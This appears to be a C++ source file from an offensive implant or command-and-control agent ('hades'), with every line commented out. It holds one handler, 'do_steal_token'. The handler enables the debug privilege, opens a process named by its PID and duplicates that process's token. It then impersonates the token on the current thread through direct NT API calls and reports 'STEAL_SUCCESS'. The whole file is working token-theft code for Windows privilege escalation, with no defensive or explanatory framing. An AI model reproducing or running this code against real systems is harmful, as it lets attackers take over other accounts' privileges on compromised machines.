// #include "cmds.hpp"
// #include "../tokens/tokens.hpp"


// void commanders::do_steal_token() {
// 	NTSTATUS Stat;
// 	CLIENT_ID ci;
// 	OBJECT_ATTRIBUTES oa;
// 	OBJECT_ATTRIBUTES ImperOa = { sizeof(OBJECT_ATTRIBUTES) };
// 	HANDLE hProc;
// 	HANDLE hProcessToken;

// 	UINT TaskID = g_ByteMgr->BeginTask();

// 	UINT PID = g_ByteMgr->Read4();
// 	ci.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
// 	ci.UniqueThread = 0;

// 	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

// 	BOOLEAN Was;

// 	Stat = hades->NtApis.RtlAdjustPrivilege(20, TRUE, FALSE, &Was);
// 	if (!NTAPI_SUCCESS(Stat)) {
// 		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
// 		g_ByteMgr->EndErr(code);
// 		return;

// 	}

// 	Stat = hades->NtApis.NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION, &oa, &ci);
// 	if (!NTAPI_SUCCESS(Stat)) {
// 		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
// 		g_ByteMgr->EndErr(code);
// 		return;
// 	}

// 	Stat = hades->NtApis.NtOpenProcessToken(hProc, TOKEN_DUPLICATE, &hProcessToken);
// 	if (!NTAPI_SUCCESS(Stat)) {
// 		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
// 		g_ByteMgr->EndErr(code);
// 		hades->WinApis.CloseHandle(hProc);
// 		return;
// 	}


// 	HANDLE hImpersonationToken;
// 	Stat = hades->NtApis.NtDuplicateToken(hProcessToken, TOKEN_QUERY | TOKEN_IMPERSONATE, &ImperOa, FALSE, TokenImpersonation, &hImpersonationToken);
// 	if (!NTAPI_SUCCESS(Stat)) {
// 		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
// 		g_ByteMgr->EndErr(code);
// 		hades->WinApis.CloseHandle(hProc);
// 		hades->WinApis.CloseHandle(hProcessToken);
// 		return;
// 	}

// 	//g_TokenMgr->InsertToken(hImpersonationToken, TaskID, PID);

// 	HANDLE cur = (HANDLE)-2;
// 	Stat = hades->NtApis.NtSetInformationThread(cur, (THREADINFOCLASS)5, &hImpersonationToken, sizeof(HANDLE));
// 	if (!NTAPI_SUCCESS(Stat)) {
// 		ULONG code = hades->NtApis.RtlNtStatusToDosError(Stat);
// 		g_ByteMgr->EndErr(code);
// 		hades->WinApis.CloseHandle(hProc);
// 		hades->WinApis.CloseHandle(hProcessToken);
// 		hades->WinApis.CloseHandle(hImpersonationToken);
// 		return;
// 	}

// 	hades->WinApis.CloseHandle(hImpersonationToken);
// 	hades->WinApis.CloseHandle(hProc);
// 	hades->WinApis.CloseHandle(hProcessToken);

// 	g_ByteMgr->EndOk(STEAL_SUCCESS);
// }